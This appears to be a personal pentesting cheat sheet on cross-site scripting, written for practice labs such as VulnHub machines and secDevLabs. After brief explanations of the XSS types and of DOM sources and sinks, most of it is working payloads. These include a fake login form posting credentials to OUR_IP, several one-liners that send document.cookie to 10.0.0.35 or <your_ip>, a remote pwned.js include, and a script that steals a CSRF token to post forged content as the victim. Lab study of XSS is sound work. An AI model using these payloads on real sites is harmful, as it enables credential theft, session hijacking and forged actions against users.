- **tags:** #xss #top10 
- ------------------
# Intro
**XSS** allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
# Types
- ***Stored:*** Stored on the back-end and displayed upon retrieval.
- **Reflected:** Processed by the back-end, but without being stored.
- **DOM-Based:** Processed on the client-side.
# Detection
Here are some basic payloads:
```html
<script>alert(window.origin);</script>
<plaintext>
<script>print();</script>
```
If modifications are persistent upon page refreshes we are dealing with *Stored* XSS.
Unlike Persistent XSS, *Non-Persistent XSS* vulnerabilities are *temporary* and are not persistent through page refreshes. Hence, our attacks only *affect the targeted* user and will not affect other users who visit the page. The key difference between *Reflected* and *DOM-based* is that on the first type user input is sent through requests to the back-end while on the other hand *DOM XSS* occurs when *JavaScript* is used to *change* the *page source* through the Document Object Model (*DOM*) (i.e. **#** on the *url*).
## DOM
### Source & Sink
The *Source* is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field. On the other hand, the *Sink* is the function that writes the user input to a DOM Object on the page. If the *Sink* function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:
- innerHTML
- DOM.outer.HTML
- DOM.document.write()
#### Example
```js
//an object (task) is created to save the user input
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
//no sanitization is being done
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
**Note:** The `innerHTML` function does not allow the use of the `<script>` tags within it as a security feature. However one could easily bypass that using something else like:
```js
<image src='' onerror=alert(document.cookie)>
```
# Examples
## Phising
```html
<div>
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
</div>
```
We could try to inject it with the `document.write();` function
## Cookie Hijacking
```js
var request = new XMLHttpRequest();
request.open('GET','http://10.0.0.35/?cookie=' + document.cookie);
request.send();
// other ways
<img src=x onerror=fetch("http://<your_ip>:port/"+document.cookie);>
new Image().src='http://10.0.0.35/index.php?c='+document.cookie;
```
## XSS bypassing [[CSRF]] token
We have published a post on a page vulnerable to XXS with the following content:
```html
<script src=http://10.0.0.35/pwned.js></script>
```
So when another user visits the post, the browser will automatically request the `pwned.js` *javascript*. On the other hand, we've started an http.server on our local machine (IP: *10.0.0.35*) waiting for the victim's call.
```js
//our first task is to capture a valid CSRF token
var domain = "http://localhost:100007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=I%20hate%20my%20boss&subtitle=I%20hate%20him&text=I%20am%20so%20angry&_csrf_token=" + token;
req2.open('POST', domain, false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
req2.send(data);
```
## Loading JavaScript from attacker's machine
Simplier example from the *Vulnhub Machine*. Inject the following javascript `<script src='http://10.0.0.35/pwned.js></script>` so when read by the victim's browser it will attempt to load the script from our local machine.
```js
//pwned.js
var req = new XMLHttpRequest();
req.open('GET', 'http://10.0.0.38/admin/admin.php?id=15&status=active');
req.send();
```
### Resource Labs
- [Hack4u XSS practice](https://github.com/globocom/secDevLabs) Use the owasp-top10-2021/a3/gossip-world Injection XSS
- [VulnHub Machine](https://www.vulnhub.com/entry/myexpense-1,405/)
- [Vulnhub Symfonos 6.1](https://www.vulnhub.com/entry/symfonos-61,458/)